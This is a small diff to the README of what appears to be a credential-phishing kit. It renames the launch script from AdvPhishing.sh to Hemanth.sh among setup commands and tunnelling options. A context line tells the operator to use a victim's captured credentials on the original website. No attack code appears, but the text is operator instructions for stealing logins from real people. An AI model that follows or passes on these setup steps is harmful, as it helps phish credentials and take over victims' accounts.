@@ -21,7 +21,7 @@ When victim enter his credentials, you need to go to original website and use th
 * cd whoami/
 * chmod 777 setup.sh
 * ./setup.sh
-* ./AdvPhishing.sh
+* ./Hemanth.sh
 
 ### AVAILABLE TUNNELLING OPTIONS
 1. LOCALHOST
